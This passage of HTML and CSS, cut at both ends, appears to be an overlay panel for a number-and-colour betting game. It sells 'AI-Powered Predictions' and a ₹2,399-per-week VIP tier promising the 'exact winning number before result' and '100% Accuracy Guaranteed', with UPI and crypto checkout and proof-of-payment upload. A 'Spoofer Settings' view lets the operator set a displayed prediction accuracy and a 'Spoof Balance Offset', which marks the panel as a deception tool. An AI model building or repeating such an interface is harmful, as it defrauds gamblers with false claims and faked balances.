display: flex; align-items: center; gap: 6px; margin-bottom: 1px; }.vip-pay-opt-name { font-size: 12.5px; font-weight: 700; color: var(--t-title); letter-spacing: -.15px;}.vip-pay-opt-desc { display: block; font-size: 9.5px; font-weight: 500; color: var(--t-body); letter-spacing: .02px;}.vip-pay-opt-arrow { width: 12px; height: 12px; flex-shrink: 0; stroke: var(--t-dim); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; opacity: 0; transform: translateX(-4px); transition: opacity .16s var(--ease), transform .16s var(--ease);}.vip-pay-upi:hover .vip-pay-opt-arrow { opacity: .7; transform: translateX(0); stroke: var(--upi); }.vip-pay-crypto:hover .vip-pay-opt-arrow { opacity: .7; transform: translateX(0); stroke: var(--crypto); }.vip-pay-foot { display: flex; align-items: center; justify-content: center; gap: 6px; padding-top: 9px; margin-top: 8px; border-top: 1px solid var(--strip); font-size: 9.5px; color: var(--t-dim); font-weight: 500;}.vip-pay-trust { display: flex; align-items: center; gap: 4px; }.vip-pay-trust .status-dot { width: 4px; height: 4px; }.vip-pay-trust-sep { opacity: .35; }.vip-loader-overlay { position: absolute; inset: 0; z-index: 50; background: rgba(10, 8, 28, 0.78); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; animation: viewIn 0.2s var(--ease);}:host(.light) .vip-loader-overlay { background: rgba(255, 255, 255, 0.82);}.vip-loader-label { font-size: 12px; font-weight: 700; color: var(--t-title); letter-spacing: 0.2px;}.vip-checkout-body { display: flex; flex-direction: column; padding: 4px 2px;}/* ── VIP Checkout + Submit Proof ── */.view-vip-checkout.active,.view-vip-submit.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.vip-checkout-shell { display: flex; flex-direction: column; }.vip-checkout-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-checkout-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.vip-checkout-head { display: grid; grid-template-columns: 1fr 1fr; border-bottom: 1px solid var(--strip);}.vip-checkout-stat { display: flex; flex-direction: column; align-items: center; gap: 2px; padding: 9px 10px; text-align: center;}.vip-checkout-stat + .vip-checkout-stat { border-left: 1px solid var(--strip); }.vip-checkout-stat-lbl { font-size: 9px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px;}.vip-checkout-stat-val { font-size: 15px; font-weight: 800; color: var(--t-title); letter-spacing: -.3px; font-variant-numeric: tabular-nums; line-height: 1.1;}.vip-checkout-stat-amt .vip-checkout-stat-val { color: var(--vip); }.vip-checkout-qr { display: flex; flex-direction: column; align-items: center; gap: 6px; padding: 12px 13px 10px; border-bottom: 1px solid var(--strip);}.vip-checkout-qr-frame { width: 118px; height: 118px; padding: 7px; border-radius: 12px; background: #fff; border: 1px solid var(--card-bdr); box-shadow: 0 2px 10px rgba(0, 0, 0, .12); display: flex; align-items: center; justify-content: center;}:host(.light) .vip-checkout-qr-frame { box-shadow: 0 2px 8px rgba(0, 0, 0, .06); }#vip-qr-img { width: 100%; height: 100%; object-fit: contain; display: block;}.vip-checkout-qr-hint { margin: 0; font-size: 9.5px; font-weight: 500; color: var(--t-dim); letter-spacing: .02px;}.vip-checkout-detail-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 8px 13px; border-bottom: 1px solid var(--strip);}.vip-detail-lbl { font-size: 9.5px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px; flex-shrink: 0;}.vip-detail-val { font-size: 10px; font-weight: 700; color: var(--t-title); font-family: var(--f); font-variant-numeric: tabular-nums; text-align: right; word-break: break-all;}.vip-checkout-payto { padding: 9px 13px 10px; border-bottom: 1px solid var(--strip);}.vip-checkout-payto-hdr { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px;}.vip-network-lbl { font-size: 8.5px; font-weight: 700; letter-spacing: .3px; color: var(--crypto); background: var(--crypto-lt); border: 1px solid color-mix(in srgb, var(--crypto) 22%, transparent); border-radius: 50px; padding: 2px 7px;}.vip-checkout-payto-row { display: flex; align-items: center; justify-content: space-between; gap: 8px;}.vip-address-val { font-size: 10.5px; font-weight: 600; color: var(--t-title); font-family: ui-monospace, SFMono-Regular, Menlo, monospace; word-break: break-all; flex: 1; min-width: 0; text-align: left; line-height: 1.35;}.vip-copy-btn { flex-shrink: 0; padding: 5px 10px; border-radius: 8px; border: 1px solid var(--card-bdr); background: var(--back-bg); color: var(--t-body); font-size: 10px; font-weight: 600; cursor: pointer; font-family: var(--f); transition: background .15s, color .15s, border-color .15s, transform .15s;}.vip-copy-btn:hover { background: var(--pro-lt); color: var(--t-title); border-color: var(--pro-bdr-h);}.vip-copy-btn:active { transform: scale(.96); }.vip-copy-btn.copied { background: var(--mine); color: #fff; border-color: var(--mine);}.vip-upi-hint { display: flex; align-items: center; justify-content: center; gap: 5px; width: 100%; margin-top: 8px; padding: 0; border: none; background: transparent; font-size: 9.5px; font-weight: 600; color: var(--pro); cursor: pointer; letter-spacing: -.05px; opacity: .85; transition: opacity .15s, transform .15s; font-family: var(--f);}.vip-upi-hint:hover { opacity: 1; }.vip-upi-hint:active { transform: scale(.98); }.vip-upi-hint svg { transition: transform .35s var(--ease); }.vip-upi-hint:hover svg { transform: rotate(180deg); }.vip-checkout-foot { padding: 10px 13px 12px; }.vip-proof-section { padding: 11px 13px; border-bottom: 1px solid var(--strip);}.vip-proof-section:last-of-type { border-bottom: none; }.vip-proof-lbl { display: block; font-size: 9.5px; font-weight: 500; color: var(--t-dim); letter-spacing: -.05px; margin-bottom: 7px;}.vip-proof-input { width: 100%; box-sizing: border-box; padding: 9px 10px; border-radius: 9px; border: 1px solid var(--card-bdr); background: var(--back-bg); color: var(--t-title); font-family: var(--f); font-size: 11.5px; font-weight: 600; outline: none; transition: border-color .15s, box-shadow .15s;}.vip-proof-input::placeholder { color: var(--t-dim); font-weight: 500; }.vip-proof-input:focus { border-color: var(--pro-bdr-h); box-shadow: 0 0 0 3px var(--pro-glow);}.vip-file-zone { border: 1.5px dashed var(--card-bdr); border-radius: 10px; height: 96px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; background: var(--back-bg); transition: border-color .15s, background .15s; overflow: hidden; position: relative;}.vip-file-zone:hover { border-color: var(--pro-bdr-h); background: var(--pro-lt);}.vip-file-placeholder { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; font-size: 10px; font-weight: 500; color: var(--t-body); pointer-events: none;}.vip-file-placeholder svg { opacity: .55; }.vip-file-preview { display: none; width: 100%; height: 100%; object-fit: cover; border-radius: 8px;}.vip-file-remove { position: absolute; top: 7px; right: 7px; width: 24px; height: 24px; border-radius: 50%; background: color-mix(in srgb, var(--pro) 88%, #000); color: #fff; border: none; display: none; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; cursor: pointer; z-index: 10; transition: transform .15s; padding: 0; line-height: 1;}.vip-file-remove:hover { filter: brightness(1.08); }.vip-file-remove:active { transform: scale(.9); }/* ── VIP Order History ── */.view-vip-history.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.vip-history-shell { display: flex; flex-direction: column; }.vip-history-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.vip-history-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.vip-history-list { display: flex; flex-direction: column; max-height: 300px; overflow-y: auto; scrollbar-width: none;}.vip-history-list::-webkit-scrollbar { display: none; }.vip-history-row { padding: 9px 13px; border-bottom: 1px solid var(--strip);}.vip-history-row:last-child { border-bottom: none; }.vip-history-row-top { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 3px;}.vip-history-type { font-size: 11px; font-weight: 700; letter-spacing: -.1px;}.vip-history-upi .vip-history-type { color: var(--upi); }.vip-history-crypto .vip-history-type { color: var(--crypto); }.vip-history-status { flex-shrink: 0; font-size: 8px; font-weight: 700; letter-spacing: .2px; text-transform: capitalize; padding: 2px 7px; border-radius: 50px;}.vip-history-status.status-pending { background: rgba(245, 166, 35, 0.12); color: #f5a623; border: 1px solid rgba(245, 166, 35, 0.25);}.vip-history-status.status-approved { background: rgba(16, 185, 129, 0.12); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.25);}.vip-history-status.status-rejected { background: rgba(239, 68, 68, 0.12); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.25);}.vip-history-remark { margin-top: 5px; padding: 5px 8px; border-radius: 6px; font-size: 9px; font-weight: 500; line-height: 1.4; color: #ef4444; background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.15);}:host(.light) .vip-history-remark { background: rgba(239, 68, 68, 0.05);}.vip-history-ref { display: block; font-size: 9.5px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; color: var(--t-body); word-break: break-all; line-height: 1.3;}.vip-history-date { display: block; margin-top: 2px; font-size: 9px; color: var(--t-dim);}.vip-history-empty { display: flex; flex-direction: column; align-items: center; gap: 5px; padding: 30px 18px; text-align: center; color: var(--t-dim);}.vip-history-empty svg { opacity: .45; margin-bottom: 2px; }.vip-history-empty-title { font-size: 11px; font-weight: 700; color: var(--t-title); letter-spacing: -.1px;}.vip-history-empty-sub { font-size: 9.5px; font-weight: 500; color: var(--t-dim); line-height: 1.4; max-width: 200px;}</style><div class="logo"><img src="/proxy-assets/logo.png?v=2" draggable="false"><\/div><div class="panel"> <div class="panel-header"> <div class="panel-title"><img src="/proxy-assets/logo.png?v=2"><span class="brand-name" id="brand-name"><\/span><span class="ai-badge">AI<\/span><span class="brand-domain" id="brand-domain"><\/span><\/div> <button class="close-btn">✕<\/button> <\/div> <div class="panel-body"> <div class="vip-loader-overlay" id="vip-loader" style="display:none;"> <div class="scan-rings"> <div class="scan-ring-o"><\/div> <div class="scan-ring-i"><\/div> <\/div> <span class="vip-loader-label">Generating Secure Session...<\/span> <\/div> <div class="view view-menu active"> <div class="menu-shell"> <div class="menu-home-card"> <button class="menu-home-opt menu-home-pro" id="btn-pro"> <div class="menu-home-icon"><svg viewBox="0 0 24 24"> <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" /> <\/svg><\/div> <div class="menu-home-body"> <div class="menu-home-top"> <span class="menu-home-name">Pro<\/span> <span class="card-badge badge-pro">Free<\/span> <\/div> <span class="menu-home-desc">AI-Powered Predictions<\/span> <\/div> <svg class="menu-home-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <button class="menu-home-opt menu-home-vip" id="btn-vip"> <div class="menu-home-icon"><svg viewBox="0 0 24 24"> <path d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5zm-1 3h16v2H4v-2z" /> <\/svg><\/div> <div class="menu-home-body"> <div class="menu-home-top"> <span class="menu-home-name">VIP<\/span> <span class="card-badge badge-vip">Private<\/span> <\/div> <span class="menu-home-desc">100% Accuracy · Private<\/span> <\/div> <svg class="menu-home-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <button class="menu-home-opt menu-home-mine" id="btn-mine"> <div class="menu-home-icon"><svg viewBox="0 0 24 24"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" /> <path d="M12 6L7.5 12.5h3.5v5.5l4.5-6.5h-3.5V6z" /> <\/svg><\/div> <div class="menu-home-body"> <div class="menu-home-top"> <span class="menu-home-name">Mining<\/span> <span class="card-badge badge-mine">Auto<\/span> <\/div> <span class="menu-home-desc">Energy-Based Auto-Mining<\/span> <\/div> <svg class="menu-home-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <\/div> <div class="menu-home-foot"> <span class="menu-home-live"><span class="status-dot"><\/span>Live · Real-Time<\/span> <span class="menu-home-foot-sep">|<\/span> <button class="menu-home-tg" id="btn-status-tg" type="button"> <svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z" /> <\/svg> Telegram <\/button> <\/div> <\/div> <\/div> <div class="view view-tg"> <div class="vip-header"> <button class="back-btn" id="btn-tg-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Join Telegram<\/span> <span class="vip-invite-pill"><span class="live-pip"><\/span>Invite Only<\/span> <\/div> <div class="vip-hero-card"> <div class="vip-tg-ring"><svg viewBox="0 0 24 24" width="26" height="26" fill="white"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z" /> <\/svg><\/div> <h3 class="vip-title">Signals. Every round.<\/h3> <p class="vip-pitch">Our members get the signal 15s before each game starts. No noise, no spam — just the edge. <\/p> <\/div> <div class="vip-stats"> <div class="vip-stat"><span class="stat-val">95%+<\/span><span class="stat-lbl">Hit Rate<\/span><\/div> <div class="vip-stat"><span class="stat-val">20K+<\/span><span class="stat-lbl">Members<\/span><\/div> <div class="vip-stat"><span class="stat-val">Free<\/span><span class="stat-lbl">Always<\/span><\/div> <\/div> <button class="vip-cta" id="btn-tg-join"> <svg viewBox="0 0 24 24" width="15" height="15" fill="white"> <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z" /> <\/svg> Open Telegram <svg class="vip-arrow" viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"> <path d="M5 12h14M13 6l6 6-6 6" /> <\/svg> <\/button> <p class="vip-note">No Account Needed · 100% Free<\/p> <\/div> <div class="view view-vip"> <div class="vip-header"> <button class="back-btn" id="btn-vip-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">VIP Access<\/span> <span class="vip-invite-pill"><span class="live-pip"><\/span>Private<\/span> <\/div> <div class="vip-pricing-shell"> <div class="vip-offer-card"> <div class="vip-balls-track" aria-hidden="true"> <img src="/assets/png/ball_0-053d2b99.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_1-49176bf8.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_2-62fbe730.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_3-31762cc1.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_4-ba9fa4ff.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_5-46891538.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_6-9319baa4.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_7-4e868eee.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_8-832f9a99.webp" class="vip-ball" alt=""> <img src="/assets/png/ball_9-9cf62e12.webp" class="vip-ball" alt=""> <\/div> <div class="vip-perks"> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">Get Number Prediction<\/span> <span class="vip-perk-desc">Get exact winning number before result<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">100% Accuracy Guaranteed<\/span> <span class="vip-perk-desc">Every prediction verified with past results<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">Number + Color + Big/Small<\/span> <span class="vip-perk-desc">All three markets covered in one signal<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <div class="vip-perk-item"> <svg class="vip-perk-mark" viewBox="0 0 16 16"> <path d="M3.5 8.2l2.8 2.8 6.2-6.4" /> <\/svg> <div class="vip-perk-content"> <span class="vip-perk-title">Auto-Mining Built In<\/span> <span class="vip-perk-desc">Set it once, earn while you sleep<\/span> <\/div> <svg class="vip-perk-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/div> <\/div> <div class="vip-offer-foot"> <div class="vip-price-line"> <span class="vip-price-amt">₹2,399<\/span><span class="vip-price-unit">/ week<\/span> <\/div> <p class="vip-price-meta">≈ $24 USD · Cancel Anytime<\/p> <button class="vip-checkout-btn" id="btn-vip-checkout">Join Now<\/button> <\/div> <\/div> <\/div> <\/div> <div class="view view-vip-pay"> <div class="vip-header"> <button class="back-btn" id="btn-vip-pay-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Select Payment<\/span> <button class="vip-hist-btn" id="btn-vip-history" aria-label="History"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="10" /> <polyline points="12 6 12 12 16 14" /> <\/svg><\/button> <\/div> <div class="vip-pay-shell"> <div class="vip-pay-card"> <div class="vip-pay-summary"> <span class="vip-pay-summary-lbl">Total Due<\/span> <span class="vip-pay-summary-amt">₹2,399<\/span> <\/div> <div class="vip-pay-options"> <button class="vip-pay-opt vip-pay-upi" id="btn-pay-upi"> <div class="vip-pay-opt-icon"><svg viewBox="0 0 24 24"> <path d="M21 7H3a2 2 0 00-2 2v10a2 2 0 002 2h18a2 2 0 002-2V9a2 2 0 00-2-2zm0 2v2h-3a2 2 0 100 4h3v2H3V9h18zm-5 2h1v2h-1v-2z" /> <\/svg><\/div> <div class="vip-pay-opt-body"> <div class="vip-pay-opt-top"> <span class="vip-pay-opt-name">UPI<\/span> <span class="card-badge badge-upi">Instant<\/span> <\/div> <span class="vip-pay-opt-desc">GPay, PhonePe, Paytm, QR<\/span> <\/div> <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <button class="vip-pay-opt vip-pay-crypto" id="btn-pay-crypto"> <div class="vip-pay-opt-icon"><svg viewBox="0 0 24 24"> <path d="M12 2l9 5.5v9L12 22l-9-5.5v-9L12 2zm0 2.2L5.5 8.5 12 12.8l6.5-4.3L12 4.2zm7.5 6.1L12 14.6 4.5 10.3v6.7L12 20.8l7.5-3.8v-6.7z" /> <\/svg><\/div> <div class="vip-pay-opt-body"> <div class="vip-pay-opt-top"> <span class="vip-pay-opt-name">Crypto<\/span> <span class="card-badge badge-crypto">USDT/TRX<\/span> <\/div> <span class="vip-pay-opt-desc">Automatic Settlement<\/span> <\/div> <svg class="vip-pay-opt-arrow" viewBox="0 0 24 24"> <path d="M9 5l7 7-7 7" /> <\/svg> <\/button> <\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe Payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure Checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-vip-checkout"> <div class="vip-header"> <button class="back-btn" id="btn-vip-checkout-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label" id="vip-checkout-title">Payment<\/span> <\/div> <div class="vip-checkout-shell"> <div class="vip-checkout-card"> <div class="vip-checkout-head"> <div class="vip-checkout-stat"> <span class="vip-checkout-stat-lbl">Time Left<\/span> <span class="vip-checkout-stat-val" id="vip-checkout-timer">24:00:00<\/span> <\/div> <div class="vip-checkout-stat vip-checkout-stat-amt"> <span class="vip-checkout-stat-lbl">Amount<\/span> <span class="vip-checkout-stat-val" id="vip-checkout-amount">₹2,399<\/span> <\/div> <\/div> <div class="vip-checkout-qr"> <div class="vip-checkout-qr-frame"> <img id="vip-qr-img" src="" alt="Scan to pay"> <\/div> <p class="vip-checkout-qr-hint">Scan With Your Payment App<\/p> <\/div> <div class="vip-checkout-detail-row"> <span class="vip-detail-lbl">Order ID<\/span> <span class="vip-detail-val" id="vip-order-id">—<\/span> <\/div> <div class="vip-checkout-payto"> <div class="vip-checkout-payto-hdr"> <span class="vip-detail-lbl" id="vip-address-lbl">UPI ID<\/span> <span class="vip-network-lbl" id="vip-network-lbl" style="display:none;">TRC20<\/span> <\/div> <div class="vip-checkout-payto-row"> <span class="vip-address-val" id="vip-address-val">—<\/span> <button type="button" class="vip-copy-btn" id="btn-vip-copy" aria-label="Copy">Copy<\/button> <\/div> <button type="button" id="vip-upi-hint" class="vip-upi-hint" style="display:none;"> <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5"> <path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3" /> <\/svg> Change UPI ID <\/button> <\/div> <div class="vip-checkout-foot"> <button class="vip-checkout-btn" id="btn-vip-confirm">Confirm Payment<\/button> <\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-vip-submit"> <div class="vip-header"> <button class="back-btn" id="btn-vip-submit-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Submit Proof<\/span> <\/div> <div class="vip-checkout-shell"> <div class="vip-checkout-card"> <div class="vip-proof-section"> <label class="vip-proof-lbl" for="vip-utr-input">UTR / Transaction Hash<\/label> <input type="text" id="vip-utr-input" class="vip-proof-input" placeholder="12-digit UTR or TxHash" autocomplete="off" spellcheck="false"> <\/div> <div class="vip-proof-section"> <label class="vip-proof-lbl">Payment Screenshot<\/label> <div class="vip-file-zone" id="vip-file-zone"> <input type="file" id="vip-file-input" accept="image/*" hidden> <div class="vip-file-placeholder" id="vip-file-placeholder"> <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="3" y="3" width="18" height="18" rx="2" ry="2"><\/rect> <circle cx="8.5" cy="8.5" r="1.5"><\/circle> <polyline points="21 15 16 10 5 21"><\/polyline> <\/svg> <span>Tap to Upload<\/span> <\/div> <img id="vip-file-preview" class="vip-file-preview" src="" alt="Payment screenshot preview"> <button type="button" class="vip-file-remove" id="btn-vip-file-remove" aria-label="Remove screenshot">&times;<\/button> <\/div> <\/div> <div class="vip-checkout-foot"> <button class="vip-checkout-btn" id="btn-vip-submit-proof">Submit Proof<\/button> <\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-vip-history"> <div class="vip-header"> <button class="back-btn" id="btn-vip-history-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Order History<\/span> <\/div> <div class="vip-history-shell"> <div class="vip-history-card"> <div class="vip-history-list" id="vip-history-list"><\/div> <\/div> <div class="vip-pay-foot"> <span class="vip-pay-trust"><span class="status-dot"><\/span>Safe payments<\/span> <span class="vip-pay-trust-sep">·<\/span> <span>Secure checkout<\/span> <\/div> <\/div> <\/div> <div class="view view-settings"> <div class="pro-top"> <button class="back-btn" id="btn-settings-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="settings-header-label">Spoofer Settings<\/span> <\/div> <div class="spoofer-card"> <div class="spoofer-section"> <label class="spoofer-label">Prediction Accuracy<\/label> <div class="spoofer-row"> <input type="range" id="spoof-acc-range" min="0" max="100" step="1" value="70"> <input type="number" id="spoof-acc-num" min="0" max="100" value="70"> <span class="spoofer-unit">%<\/span> <\/div> <\/div> <div class="spoofer-section"> <label class="spoofer-label">Spoof Balance Offset<\/label> <div class="spoofer-row"> <input type="number" id="spoof-bal" min="0" step="100" value="5000"> <span class="spoofer-unit">₹<\/span> <\/div> <\/div> <button class="spoofer-reset" id="btn-spoof-reset">Reset Defaults<\/button> <\/div> <div class="spoofer-card" style="margin-top: 10px;"> <label class="spoofer-label">Withdrawal Requests<\/label> <div id="spoof-withdrawals-list"><\/div> <\/div> <\/div> <div class="view view-pro"> <div class="pro-top"> <button class="back-btn" id="btn-pro-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <div class="pro-gameinfo"> <div class="pro-gameinfo-row"><span class="pro-game-name" id="pro-mode">—<\/span><span class="pro-live-badge"><span class="live-pip"><\/span>Live<\/span><\/div> <span class="pro-round" id="pro-period">—<\/span> <\/div> <\/div> <div class="pro-timer-wrap" id="pro-timer-wrap"> <div class="pro-timer-label">Time Remaining<\/div> <span class="pro-timer" id="pro-timer">00:00<\/span> <\/div> <div class="pro-card" id="pro-card"> <div class="pro-scanning" id="pro-waiting"> <div class="scan-rings"> <div class="scan-ring-o"><\/div> <div class="scan-ring-i"><\/div> <\/div> <span class="scan-label" id="scan-lbl">Scanning<span class="s-dot"><\/span><span class="s-dot"><\/span><span class="s-dot"><\/span><\/span> <\/div> <div class="pro-prediction" id="pro-prediction" style="display:none"> <div class="streak-badge" id="streak-badge"><span>🔥<\/span><span id="streak-text">—<\/span><\/div> <div class="pred-hero"> <div class="pred-glow" id="pred-glow"><\/div> <div class="pred-ball" id="hero-ball"><\/div> <\/div> <div class="pred-tags"><span class="pred-size" id="pred-pill">Big<\/span><span class="pred-color" id="pred-color">Red<\/span><\/div> <div class="pred-conf"> <div class="conf-track"> <div class="conf-fill" id="conf-fill"><\/div> <\/div><span class="conf-pct" id="conf-pct">0%<\/span> <\/div> <div class="pred-history" id="pred-history"><span class="hist-label">Recent<\/span><\/div> <\/div> <\/div> <\/div> <div class="view view-mining"> <div class="vip-header"> <button class="back-btn" id="btn-mining-back" aria-label="Back"><svg viewBox="0 0 24 24"> <path d="M19 12H5M12 5l-7 7 7 7" /> <\/svg><\/button> <span class="vip-header-label">Auto Mining<\/span> <button class="mine-hist-btn" id="btn-mining-history" aria-label="History"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="10" /> <polyline points="12 6 12 12 16 14" /> <\/svg><\/button> <span class="mine-energy-pill" style="display:none"><svg class="energy-svg" viewBox="0 0 24 24"> <path d="M12 2L4.5 14h6v8L18 10h-6V2z" /> <\/svg><span id="mine-energy-count">10<\/span><\/span> <\/div> <div class="mine-shell"> <div class="mine-card"> <div class="mine-row"> <span class="mine-lbl"><svg class="mine-lbl-icon" viewBox="0 0 24 24" fill="none" 